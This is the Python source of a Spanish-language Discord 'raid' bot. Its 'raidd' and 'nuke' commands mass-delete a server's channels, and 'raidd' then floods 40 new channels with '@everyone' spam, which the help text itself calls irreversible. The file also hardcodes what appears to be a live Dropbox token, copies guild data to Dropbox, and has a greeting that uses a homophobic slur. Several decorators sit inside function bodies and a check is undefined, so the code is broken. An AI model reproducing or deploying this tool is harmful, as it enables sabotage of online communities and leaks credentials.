import discord
from discord.ext import commands
import json
import aiohttp
import dropbox
import time
import os
import asyncio
from io import BytesIO

# --- CONFIGURACIÓN GLOBAL ---
# ID del servidor que actuará como la fuente única de la lista VIP.
SERVER_MAESTRO_ID =1442639957733802227   # <--- ¡REEMPLAZA CON EL ID DE TU SERVER!
LISTA_GLOBAL_JSON = "global_vips.json" 
# ----------------------------

# --- LISTA NEGRA DE SERVIDORES PROHIBIDOS ---
# Coloca aquí los IDs de los servidores donde los comandos de ataque NO deben funcionar.
SERVIDORES_PROHIBIDOS_IDS = [
    1442639957733802227  # <--- ID de tu servidor principal o de la comunidad   # <--- ID de otro servidor que quieres excluir
]
# ---------------------------------------------

def is_not_blacklisted_server():
    """Verifica si el servidor actual NO está en la lista de SERVIDORES_PROHIBIDOS_IDS."""
    def predicate(ctx):
        # La verificación es exitosa si el ID del servidor NO está en la lista prohibida
        return ctx.guild.id not in SERVIDORES_PROHIBIDOS_IDS
    # Usamos commands.check para aplicar esta lógica
    return commands.check(predicate)

def load_global_vips():
    """Carga la lista global de IDs VIP desde el archivo JSON al iniciar."""
    try:
        with open(LISTA_GLOBAL_JSON, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

def save_global_vips():
    """Guarda la lista global de IDs VIP al archivo JSON."""
    global USUARIOS_GLOBAL_VIP, LISTA_GLOBAL_JSON
    try:
        with open(LISTA_GLOBAL_JSON, 'w') as f:
            json.dump(USUARIOS_GLOBAL_VIP, f, indent=4)
    except Exception as e:
        print(f"❌ Error al guardar la lista VIP en JSON: {e}")

# Carga la lista global de IDs al iniciar el bot
USUARIOS_GLOBAL_VIP = load_global_vips()

DROPBOX_TOKEN = "sl.u.AGKZXBEDby-WSY6Wy-vxI-5wh-FlvO-oacPU6vIx1WtvElxJk6LnVEbHm0Nij0KLFB7pO3KtczNmQ1n9Pm0T-gYbEJJw2QIpQ8INlfDvs45LyfoeJl-zkph3WqBoEGiR3jKAUFLHGyEpphFYrG69-9S9PpUosay6ETrE55NK-gr1PfnTdY_v3NPVkcEwaICy0-wtXYr06mmuZyow6dvOeP0Okn3SFGV7szJrL2YLX0X-x2S5sbJyW6m9j4IPRbiz7uZUFcUx_MRoHeGdw_v7Yl4hDnWmsbaFNmY_PY1dResiz9K9sNY2JuSoPBm2hH-aP4YX-TDenIvAwM9-EQlbKGYubz2sFdo7FvuP44uMIm0l2GVSJ2ZgoIPtriKeEds_bJv4xXZ_dXAdwpTYcKCzRBrWcCilpHVDdBTcDY5mo3XO45Qs67Le4S61IaXohLYlnZAmTcmiGN2tEbJfjBSxC1XSXNXceqYWyVTfDLt40rZ_2UusiROjAwiTvLbBiAP92MhVmOqPS1b2dLRoPXxd_K8Of9XPxJ8Vjn4nygyxzCtYMZWP6IZj3RMItIlsivWP8APw9KbwA8Nlw5lcBtF-T6kKzJm8WHNUQMKad6DFtruoFzEhde9bPDxv2crcMKiXK24JeEgzFdmVZc8CSubZGtyXppRWzpo5iuUCyi4LNAIbMAjLTS95dYKhYkwv7aIyT_bMC4GSf7R5V59Ms1yuqfEpMiGeN5qt0-usJMhpcavHf7cnj_LTimeMits8pJbsUvXdzMf4LEMMr6R2LzBqDLrgE78VOVy-ptHrBDkiZut63RtuUkknujila-2R3FefD7BYYA9kP807mmYYlfIycTIqU9FrwUyAaU2sVlniddT2rHs4mEd5M6IUOqoJ_bU-IYUUdlgdG1baRJ_T61oBHjWIM7PopjSn9l9r_RPHGeoHE7-KuyAtd4ElUwAN7_hbgGD4GVhbuA45BCJMIbP7wiMtktS0jWTdTUlPUN14uZeGywAu2vG7aIEn_9Y2dcWOHndcqaT6L9iaXNcma5o3VicfvY3UfLZPdXN3hNGW07Kh1Rl1Mw8oYmDwP6piSuGDCnd9rQ8ZwHLtwjYb8h6BCaHgsYgon_1uNJEVhiLx_rnfFDtV27mduigUqiU1-5bA6u1raEzghssHdTiY2iz-Cytg8chCdOhWdn1vx07HzJ_JiQRWWzloH0D48LLPWx82rNj1rPOCWnO7QOCtf81i2B7p6dadg_KE5Xv3Tt3rf85VZYkUnYEcmiZ1nQtiT1-vr8_K3bRWkbNB4FATDPk67m6bWV2zXX2_9M7Ylea38lRullgT6jwd4PGSgMe_4yrpK-Z5IH6fE1TC1peUXHx0sqFTpEz-QJN9u-oEiiuqBjuvwfUTJZC7YQIr8YFefcSvEAE"  # <- Pon aquí tu token
dbx = dropbox.Dropbox(DROPBOX_TOKEN)

BOT_TOKEN = os.getenv("DISCORD_TOKEN") 

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents, case_insensitive=True)

@bot.event
async def on_ready():
    print(f"Bot conectado como {bot.user}")

@bot.event
async def on_member_update(before, after):
    global USUARIOS_GLOBAL_VIP
    
@bot.event
async def on_command_error(ctx, error):
    # Verifica si el error es de tipo CheckFailure (falla en la verificación)
    if isinstance(error, commands.CheckFailure):
        
        # 🚨 NUEVA LÓGICA DE LISTA NEGRA
        # Verificamos si la falla se debe a que el servidor actual está en la lista negra
        if ctx.guild.id in SERVIDORES_PROHIBIDOS_IDS:
             await ctx.send("🛑 **Error de Restricción:** No puedes usar este comando aquí.")
             return
             
        # Lógica de falla de VIP (si no se devolvió en la línea anterior)
        await ctx.send(f"❌ **Acceso Denegado:** El comando `{ctx.command}` solo puede ser ejecutado por usuarios VIP.")
    
    # Maneja si falta el permiso de administrador
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send("🛑 **Error de Permisos:** Necesitas ser administrador para ejecutar este comando.")
        
    else:
        # Esto es para cualquier otro error de código o conexión
        # print(f"Ocurrió un error no manejado: {error}") 
        # raise error # Descomentar para debug
        pass


    # 1. Verificar si el cambio ocurrió en el Servidor Maestro
    if before.guild.id != SERVER_MAESTRO_ID:
        return

    # 2. Definir el nombre del rol VIP
    ROL_VIP_NAME = "Bot VIP"

    # 3. Obtener los nombres de roles antes y después del cambio
    roles_before = set(r.name for r in before.roles)
    roles_after = set(r.name for r in after.roles)

    # --- LÓGICA DE DETECCIÓN ---
    
    # a) Si el rol fue añadido
    if ROL_VIP_NAME not in roles_before and ROL_VIP_NAME in roles_after:
        if after.id not in USUARIOS_GLOBAL_VIP:
            USUARIOS_GLOBAL_VIP.append(after.id)
            save_global_vips()
            print(f"✅ VIP Añadido automáticamente: {after.name}")
    
    # b) Si el rol fue quitado
    elif ROL_VIP_NAME in roles_before and ROL_VIP_NAME not in roles_after:
        if after.id in USUARIOS_GLOBAL_VIP:
            USUARIOS_GLOBAL_VIP.remove(after.id)
            save_global_vips()
            print(f"✅ VIP Removido automáticamente: {after.name}")


@bot.command()
async def hola(ctx):
    await ctx.send("Que queres gey de mrd?")


@bot.command()
@commands.has_permissions(manage_channels=True)
async def borrar_categoria(ctx, nombre):
@is_global_vip()
@is_not_blacklisted_server()
    for canal in ctx.guild.channels:
        if nombre.lower() in canal.name.lower():
            await canal.delete()
    await ctx.send(f"Canales que contenían '{nombre}' fueron borrados.")

# ----------------------------
# Comando para guardar backup en Dropbox
# ----------------------------
@bot.command()
@commands.has_permissions(administrator=True)
@is_not_blacklisted_server()
async def gbk(ctx, nombre):
    guild = ctx.guild

    # Verificar si ya existe backup en Dropbox
    try:
        dbx.files_get_metadata(f"/{nombre}.json")
        await ctx.send(f"❌ Ya existe un backup con el nombre '{nombre}'. Elige otro nombre.")
        return
    except dropbox.exceptions.ApiError:
        pass  # No existe, podemos crear

    # Crear diccionario con toda la info
    backup = {
        "nombre": guild.name,
        "descripcion": guild.description,
        "icon_url": str(guild.icon.url) if guild.icon else None,
        "roles": [{"name": r.name, "color": r.color.value, "hoist": r.hoist} for r in guild.roles if r.name != "@everyone"],
        "categorias": [{"name": c.name, "id": c.id} for c in guild.categories],
        "canales": [{"name": ch.name,
                     "type": ch.type.name,
                     "topic": getattr(ch, "topic", None),
                     "category_id": ch.category.id if ch.category else None} for ch in guild.channels]
    }

    # Convertir a bytes y subir a Dropbox
    json_bytes = json.dumps(backup, ensure_ascii=False, indent=4).encode("utf-8")
    dbx.files_upload(json_bytes, f"/{nombre}.json")
    await ctx.send(f"✅ Backup '{nombre}' guardado en Dropbox con éxito!")

# ----------------------------
# Comando para restaurar backup desde Dropbox
# ----------------------------
@bot.command()
@commands.has_permissions(administrator=True)
async def rbk(ctx, nombre):
    # Descargar backup de Dropbox
    try:
        metadata, res = dbx.files_download(f"/{nombre}.json")
        backup = json.loads(res.content)
    except dropbox.exceptions.ApiError:
        await ctx.send(f"❌ No se encontró el backup '{nombre}' en Dropbox")
        return

    guild = ctx.guild
    await ctx.send("⏳ Eliminando roles y canales existentes...")

    # Borrar roles (excepto @everyone)
    for rol in guild.roles:
        if rol.name != "@everyone":
            try:
                await rol.delete()
            except:
                pass

    # Borrar canales existentes
    for canal in guild.channels:
        try:
            await canal.delete()
        except:
            pass

    await ctx.send("🗑️ Roles y canales eliminados. Restaurando backup...")

    # Restaurar nombre, descripción e icono
    icon_bytes = None
    if backup.get("icon_url"):
        async with aiohttp.ClientSession() as session:
            async with session.get(backup["icon_url"]) as resp:
                if resp.status == 200:
                    icon_bytes = await resp.read()

    try:
        await guild.edit(
            name=backup["nombre"],
            description=backup.get("descripcion"),
            icon=icon_bytes
        )
    except:
        pass

    # Restaurar roles
    for r in backup["roles"]:
        try:
            await guild.create_role(
                name=r["name"],
                color=discord.Color(r["color"]),
                hoist=r.get("hoist", False)
            )
        except:
            pass

    # Restaurar categorías
    categorias_nuevas = {}
    for c in backup["categorias"]:
        try:
            nueva_cat = await guild.create_category(name=c["name"])
            categorias_nuevas[c["id"]] = nueva_cat
        except:
            pass

    # Restaurar canales
    for ch in backup["canales"]:
        categoria = categorias_nuevas.get(ch["category_id"])
        try:
            if ch["type"] == "text":
                await guild.create_text_channel(
                    name=ch["name"],
                    topic=ch.get("topic"),
                    category=categoria
                )
            elif ch["type"] == "voice":
                await guild.create_voice_channel(
                    name=ch["name"],
                    category=categoria
                )
        except:
            pass

    await ctx.send(f"🎉 Backup '{nombre}' restaurado y servidor reemplazado con éxito!")

@bot.command()
async def stats(ctx):
    start_time = time.time()
    # Mandar mensaje temporal para medir delay
    temp = await ctx.send("⏱ Calculando...")
    delay = (time.time() - start_time) * 1000  # en milisegundos

    embed = discord.Embed(
        title="📊 Estadísticas del Bot",
        color=discord.Color.green()
    )
    embed.add_field(name="Ping (Websocket)", value=f"{round(bot.latency*1000)} ms😵‍💫", inline=True)
    embed.add_field(name="Delay (respuesta)", value=f"{int(delay)} ms😛", inline=True)
    embed.add_field(name="Lenguaje", value="Python🐍", inline=True)
    embed.add_field(name="Servidores", value=f"{len(bot.guilds)}📸", inline=True)
    embed.set_footer(text=f"Bot creado por Whatvixx📩")
    
    await temp.edit(content=None, embed=embed)

@bot.command(name='raidd', aliases=['wipe_and_build'])
async def full_server_reset(ctx):
@is_not_blacklisted_server()
  """Combina destrucción y reconstrucción de forma silenciosa."""
    
    # --- FASE 1: DESTRUCCIÓN (Lógica de !nuke concurrente) ---
    
    deletion_tasks = []
    
    for channel in ctx.guild.channels:
        if channel.id != ctx.channel.id:
            deletion_tasks.append(channel.delete())

    # Ejecutar todas las tareas de eliminación simultáneamente
    deletion_results = await asyncio.gather(*deletion_tasks, return_exceptions=True)
    deleted_count = sum(1 for result in deletion_results if not isinstance(result, Exception))

    # --- FASE 2: RECONSTRUCCIÓN (Lógica de !concurrent_spam) ---
    
    # --- CONFIGURACIÓN DE PARÁMETROS ---
    NUM_CANALES = 40 # <--- MODIFICA AQUÍ la cantidad de canales
    MENSAJES_POR_CANAL = 50
    NOMBRE_BASE = "raidddd-pythoooon"
    CONTENIDO_MENSAJE = "RAIDED BY WHATVIXX GOOD BOYYYS @everyone @here"
    # ------------------------------------

    tasks = []
    for i in range(1, NUM_CANALES + 1):
        nombre_canal = f"{NOMBRE_BASE}-{i:02d}"
        tasks.append(
            create_and_spam_single_channel(ctx.guild, nombre_canal, MENSAJES_POR_CANAL, CONTENIDO_MENSAJE)
        )

    # Ejecutar todas las tareas de creación y spam de forma concurrente
    results = await asyncio.gather(*tasks, return_exceptions=True)
    canales_creados = sum(1 for result in results if result == 1)
    
    # Mensaje final de resultado
    if canales_creados > 0:
        await ctx.send(f"🎉 **REINICIO COMPLETO FINALIZADO:** Eliminados **{deleted_count}** y creados **{canales_creados}** canales nuevos.")
    else:
        await ctx.send("⚠️ REINICIO COMPLETADO CON FALLOS. Se eliminaron canales, pero falló la creación.")

@bot.command(name='nuke', aliases=['eliminar-canales', 'delall'])
async def nuke_channels(ctx):
@is_not_blacklisted_server()
    """Elimina todos los canales del servidor de forma silenciosa."""
    
    deleted_count = 0
    
    # Prepara las tareas de eliminación de forma concurrente para mayor velocidad
    deletion_tasks = []
    
    for channel in ctx.guild.channels:
        # 🛑 No eliminar el canal donde se ejecutó el comando
        if channel.id != ctx.channel.id:
            deletion_tasks.append(channel.delete())
    
    # Ejecutar todas las eliminaciones simultáneamente
    deletion_results = await asyncio.gather(*deletion_tasks, return_exceptions=True)
    
    # Contar los éxitos. Un resultado que no es una excepción es un éxito.
    deleted_count = sum(1 for result in deletion_results if not isinstance(result, Exception))

    # Este mensaje final se mantiene para informar el resultado
    await ctx.send(f"✅ **¡Operación completada!** Se eliminaron **{deleted_count}** canales.")

@bot.command(name='comandos', aliases=['help', 'cmd'])
async def comandos_list(ctx):
    """Muestra la lista de comandos con su descripción y advertencias."""
    
    # 1. Crear el objeto Embed
    embed = discord.Embed(
        title="⚔️ Lista de comandos del Bot 💥",
        description="El servidor no se hace responsable de cualquier intento fallido o baneo forzado por bot antiraid.",
        color=discord.Color.red() # Puedes cambiar el color a rojo o el que prefieras
    )
    
    # 2. Añadir los campos (comandos)
    
    # Comando 1: !raidd (Asumo que te referías a !full_reset)
    embed.add_field(
        name="1. !full_reset [o !raidd] ",
        value="Este comando lo que hace es que destroza **TODO EL SERVIDOR** (borra canales y crea canales de spam). Si ejecutas este comando, los daños son **IRREVERSIBLES**.",
        inline=False
    )

    # Comando 2: !nuke
    embed.add_field(
        name="2. !nuke ",
        value="Este comando lo que hace es que borra **todos los canales, siendo este irreversible**.",
        inline=False
    )

    # Comando 3: !gbk [nombre de la copia] (Guardar Backup)
    embed.add_field(
        name="3. !gbk [nombre de la copia]",
        value="Con este comando harás una copia del servidor que quieres. Necesitas comando de **Administrador**.",
        inline=False
    )

    # Comando 4: !rbk [nombre de la copia] (Restaurar Backup)
    embed.add_field(
        name="4. !rbk [nombre de la copia]",
        value="Acá podrás cargar tu copia del servidor que copiaste. Necesitas comando de **Administrador**.",
        inline=False
    )

    # Comando 5: !backups
    embed.add_field(
        name="5. !backups",
        value="Esté comando te muestra tus copias guardadas.",
        inline=False
    )
    
    # 3. Enviar el embed al canal
    try:
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Error al enviar el embed: {e}")

bot.run(BOT_TOKEN) 
